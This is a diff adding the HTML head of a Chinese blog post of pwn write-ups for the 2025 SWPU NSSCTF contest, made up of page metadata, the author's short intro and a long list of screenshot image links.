@@ -1,0 +1,1801 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fufu.png">
+  <link rel="icon" href="/img/fufu.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Meiyouqian">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前边很大一部分是我很久以前刚刚学的时候写的，想想也要有8、9个月以前了，前边很多题可能解法比较复杂或者写的烂也是因为这个（） 最近翻出来发现之前不会的一直尬在那里没去补，所以就想着补完发一份了 当时作为新人打这个比赛其实打的还是很开心的，当时的ai也没那么发达   pwnDoes your nc work?  直接虚拟机nc node5.anna.nssctf.cn 25196   这边我们先进入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2025-SWPU-NSSCTF(Pwn全)">
+<meta property="og:url" content="https://mei-you-qian.github.io/2026/04/21/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/index.html">
+<meta property="og:site_name" content="玫幽倩的小博客">
+<meta property="og:description" content="前边很大一部分是我很久以前刚刚学的时候写的，想想也要有8、9个月以前了，前边很多题可能解法比较复杂或者写的烂也是因为这个（） 最近翻出来发现之前不会的一直尬在那里没去补，所以就想着补完发一份了 当时作为新人打这个比赛其实打的还是很开心的，当时的ai也没那么发达   pwnDoes your nc work?  直接虚拟机nc node5.anna.nssctf.cn 25196   这边我们先进入">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776392819930-ec625c15-a065-4985-9afc-ed8c9f808612.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1754153831500-62ba24bc-962a-4526-9dfb-41d3580d1976.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1754154096695-f630992d-b941-4e66-a3fd-6158cbd5a49d.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1754237635020-3431ba7d-308f-4ab2-8007-997b1d0895fb.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1754237682291-0ba86c63-1838-47e9-ab9b-452de36f614f.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1754237890868-84bd0c2c-652c-4732-8f0d-053fbd97bd6d.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1754237977924-2acb3d32-abd3-4691-82b1-fbd96b1e6e54.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1754238036358-b959325b-b3f1-488a-8b23-a27f6d0810a7.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1754238120054-237be44c-12bc-433f-91c3-76880d3bbc2d.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1754238171428-ce97df10-1104-48aa-a9ca-4fc04da286dd.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1754117227780-1987c087-f4ff-4806-960b-9fadba3c4cbc.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1754123493681-8bced829-41f1-4246-921d-783f038a92bd.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1754123776900-053c2bb8-7aae-47aa-8096-3b18e4f7bb3b.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1754153659740-82944e7b-2e85-498f-a7c8-ad77696b6061.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1754153617103-b5e6477e-70af-4ff0-8577-8a6ac8575810.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1757118889462-5eb5200e-99ca-47b2-99c5-84ed06428404.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758944973490-bb989c77-5aa5-4d0c-abb5-3bf33b58f536.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1757119084622-f03cf3e5-38c2-497f-910d-883accc4c4c8.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1757119169313-3c465c4d-e278-4245-87b2-97842e4734a1.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1757119201534-b5c99fec-11c6-4707-bf9c-58f8caa0ebe8.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1755765916320-c5c63cb4-dbf9-43f7-a056-cc4518e3f6ca.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758944719819-d7c675e2-115c-4e85-9337-271eb1a0bd09.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758944904686-3ca0aad6-e81a-4046-96df-867798e79b17.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758945160389-2ec5aae0-f5b5-4fe3-9ffb-c4a04cdc3c5f.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758945399713-141ecc15-bf06-4432-8ae9-055114f7df7e.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758945687584-34457e57-fd9c-4204-9be4-88d1f9d296b9.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758945795623-56861d08-ef37-4c8d-9871-ef772e0824f9.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758945891593-6f0108b1-6baa-4e5d-8157-6fb362e51872.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758945964141-70ee960a-fa95-4ffd-a273-7eceb9e0e655.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758945976791-38794361-38f5-4f4c-84a3-7922bfb138b7.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758945997988-88ef99b8-e59b-437e-8b1e-f75b819f1ab1.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758946016287-6dad245a-05c1-40c2-b19c-8f46008c2e23.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758946031829-32fe0bca-7aac-4200-8d0b-0bbd55495297.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758946170281-79f7b6cf-2b07-46a5-9bbe-b9603acac39d.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758946354915-5ca7fba1-86c9-4ac5-b9a8-110387720bdc.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758953864583-85e09cb4-3dd2-450f-a8c5-a8ba08802dd8.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758953872596-322159e9-2307-4d8a-93de-e7a3a6712233.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758953994740-79d0eb46-14c2-4a7b-a92e-1ab6abb16ce0.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758954733756-c641bae8-349e-4c2a-b26d-49f7c4d20a5e.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758955287767-cc9f8c45-fdb4-4967-b689-628e1e78cb50.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758955891146-ba9a30ec-1126-48cd-bd74-abbdffa7f0f1.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758956440431-8feef276-3496-46cf-922a-aca7efe69692.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758956587949-4fda8ecf-0035-4e29-bf62-f79480ad0c9a.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758956662099-9ac47324-6a2d-44e1-8a5d-29767d0b7ac7.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758956775769-a9a995e7-145c-4f6f-b54b-e5325509514c.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758956819047-c7d3b036-31de-410d-a84c-cd2b44ef71bd.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758956946259-a5d86689-fe55-427b-b462-ff6590c19395.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758957185481-2cca4b3a-3f96-4dc5-ae6a-a6294bba0c6b.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758957921688-581021f4-996e-462f-8481-cf08a99eefac.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758957940417-54f1c405-1997-4a96-b63d-bbeab3efacbf.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758957969792-465b5470-339f-491c-82eb-33271f81f56b.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758958337900-9234c967-6d8e-49d8-927e-32bec0c6f6ab.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758958172333-fb556584-564c-4cdb-a44a-5136d6dd4364.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758958674696-bb56f4be-d00e-49d5-b3ab-500230c09489.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758958427855-3f3abac0-e0ea-45ab-b864-26942f84e26e.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758961160086-89b7458f-6409-4e34-92c6-1eea4737bafd.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758961468426-65e46c1e-2417-4a78-b86d-4ad2548aa8ec.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758961426826-44b612c5-8e08-4114-bfa5-e2220501500c.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758961765033-9317d8f0-9ec6-47a9-9805-fb1e192f39df.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758961897498-23a35fad-3556-4dcb-98bd-555c0b06e72d.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758962043130-e54689a3-a93f-4d1c-97dd-630d605030ed.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758962065248-2fd3e663-3e53-40a7-bc4b-ce61f147d562.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758962342813-e1bd2adb-c612-4536-8bc4-b33f6f13a668.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758962365702-4f29ece8-85eb-4bb8-8158-a82687234fdb.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758963083683-4aaa1257-4de8-4173-b3b2-dc8b41a81fc4.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758974901415-9853bfba-b55e-41e7-8547-71eb5a77c534.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758975057474-b59d09f6-b43b-4a1c-b89a-c9005a76dea3.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758975386939-10f17c5d-1758-42aa-bb22-4d35c8fb9081.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758975599756-68738cb2-f5fe-4321-be95-4df0df312c7f.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758975678191-ff0d07b3-a00f-417a-a260-7b4287ea25c6.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758975768416-f22d36de-7d99-4e07-b148-0aed77413113.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758976053333-08c62b51-1747-4bbb-9898-a3f20467b9b1.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758976079992-be47c2f5-1a67-4d9e-8b39-92066cff729b.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758976879670-e6755256-165a-4791-b360-3c30ece1ac8c.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758976998026-a6b9f055-49c0-4a82-9dc1-942a44acb0b8.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758976053333-08c62b51-1747-4bbb-9898-a3f20467b9b1.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759019393670-47a72b4f-2b7b-4e05-93bd-207c95cc982c.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759019603130-cf86e32f-e1e2-4652-9bc8-875d724e26e1.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759019719756-df21ceba-1c5c-4c04-8d5a-f6e5b4def037.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758979155744-ba485ecf-2602-4afa-bdc9-f29b4a4707cc.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759055512794-ae73909e-0377-45bb-bb50-a5ead3a63ce2.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759055503240-5accaaea-31f2-4884-8c4c-848bf6687e9b.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759055542536-35bb9887-2a45-4e93-941b-f7aaf43002ea.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759055567288-499f4095-42dc-4430-9c52-8a2641b76ee9.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759055633045-a0db06b8-0326-4fb0-af02-dc0469f855f2.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759055734310-2d0e63ec-8715-4763-a3c7-cf375761a611.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759055771722-1188706c-b68a-4386-bfb3-446132178135.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759056357576-e15b376d-6958-46b9-97b7-2a0c855423fb.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759062551606-21ee8f47-ed32-4f2f-b26f-f01f9a70e0d2.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759062658780-b1f1dd54-3e44-4371-934d-4b7103da466d.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759062613766-42e4eace-302d-40f6-9c73-b6f93da0c864.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759062716734-1f6653ec-8c39-48ee-8d93-5baf129879d4.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759063087281-963415c4-5ef6-4fdf-a489-764e4ba67cb5.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759063178037-4091f055-6364-4741-b006-272f090d217c.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759063377749-6e3cc987-6be0-436d-9f1c-6dad5c97266b.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759064756218-46613cdd-e0d5-4cdd-b543-0ba76c25c2d5.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759056412068-99c6bf7d-a983-4e86-add4-f580c8d1673a.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759056468191-f8fe766a-957a-48ac-a9bd-d8b92b13d561.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759056522106-cf946e32-5e52-4522-8d79-f443603914a1.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776393671171-1a808125-7a16-4ff9-adb7-e820b1cbfd19.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776393866018-bd3774fe-3a80-4266-b82c-1c5a36421d1f.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776393996200-e7242ede-8e66-4d32-90de-d5e61dba00ff.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776394823152-386a82a2-8ed4-4b0b-a758-61d52678d6dc.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758979352193-19903487-1816-4f0f-9bb9-e40288c00185.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758979427242-c2f2a289-caaf-4345-a283-9f11701f96b5.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758979636813-8f43725f-fa83-4104-b34c-ada79539f8b2.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758979732307-68862fd1-d6b6-472a-a1f1-54e924992ec3.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776394877451-ddb058e1-adc5-4365-988c-34d1531e3db7.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776394993487-49cfb687-b6cd-46dc-ac95-3cf45519be52.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776395388940-469054f3-ad6c-4ab9-a475-6a151c667f6a.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776393537159-54d0a24d-7451-4bda-8110-fdf8fae79901.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776402394657-552ee6fd-91a0-4402-b4c2-5576991ce742.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776402421957-7873a0d2-5478-4679-a8f6-031b954e68cc.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776402507550-56898a85-c22b-444d-9da9-dbc8adb46fac.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776403092232-5890862d-3380-4f1e-b6ed-ef5b114983b0.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776403298078-ba061a91-de32-4ad7-85ca-da1fac8bd73b.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776403890803-e8f820be-b0dc-4ea1-84f0-cca44ee8f246.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776404090678-1889f7f6-15fe-4ed0-b9f0-1b87ae99700b.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776404283710-f1e4d3fd-d4a0-4281-b9eb-02f7160094ac.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776403341262-8933736a-bdce-4ab2-9d6b-0988983911d5.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776404438392-7994dff0-527f-443e-9c96-32ab511c213d.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776404478467-8fc0ccca-def3-4856-b65d-5d365a1b95f6.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776404640672-6d7a4825-7ff4-405f-b40b-c24a44f394b1.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776404701828-4c7df1ec-ef78-4233-9287-be798da45d22.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776405336196-2692dd0d-d503-4661-9498-c95e3d78897f.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776405427000-0616e09c-31fc-498f-8251-cfd56a4b68f0.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776403356777-c405dbd7-1ebe-445f-a0c6-aa6f217208f6.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776405643096-954de61d-e16c-418a-a087-f8f883c9c561.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776405701574-6703815a-3faa-462c-9e7b-580456b528fa.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776406183992-79da602b-20fa-473e-bbfa-3ac235e8a3d3.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776403366887-96ccc032-4b9c-43a4-9d8a-672b9c0f76df.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776413542364-f39759b9-b54e-4be1-a6e3-ca729ba673b0.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776413565022-afa12216-5608-4598-9ef6-965cdff8aa48.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776414011027-859e6246-c406-4972-b460-029f2546de97.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776413670126-5a76dcf5-20a1-4c2a-9134-cc3fcc4e0bf1.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776413701987-dc997a87-70f2-42b2-b12b-ced005b02677.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776414230132-2ea32103-4297-4a8e-ab23-018ca8a8412a.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776413710947-50b5d906-1d5b-41d8-a5e8-a990e9298b3b.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776414058486-a0c394f2-a2ad-4416-98a6-770c1887dfc2.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776413722537-b19bb16f-b959-483f-9d95-40aef4b1ec41.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776414272150-cf262187-3cce-4470-997e-09ae3cef369b.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776413777171-9eb6e4e9-33ec-4a2e-88cc-4dcd958bccfb.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776414285236-dcb96049-fe7c-46f1-a769-cc206103c992.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776414907206-00532225-1ef0-41b4-9a4c-ee466f1e2a63.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776415163378-3a7a6f69-d223-471b-8cb9-8c8910a24b85.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776415223882-b393868c-2ccf-4536-8ade-cb5186e90ecb.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776416145227-ab20b359-1f55-4039-bd3d-8b711bdba8c8.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776403390207-20d6acdf-b14f-4d69-8ebc-439030b9ae06.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776583549802-ec104249-125b-4baf-ae7b-3763743856bb.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776583571014-499c2074-e58c-4d17-ad18-8cdc73084844.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776583761755-e27d98bb-db34-4b22-9cae-e67bd7a0048b.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776403401521-32879af4-53c8-49fa-8c66-1d604f443ccc.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776585121219-5d7669a7-67f4-4631-8e06-9133a34cbb41.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776585147178-daa3808a-5a80-4a8c-90be-01e8532cfba9.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776585329729-a99be63d-0ef7-4e45-85dc-9912b16ffe71.png">
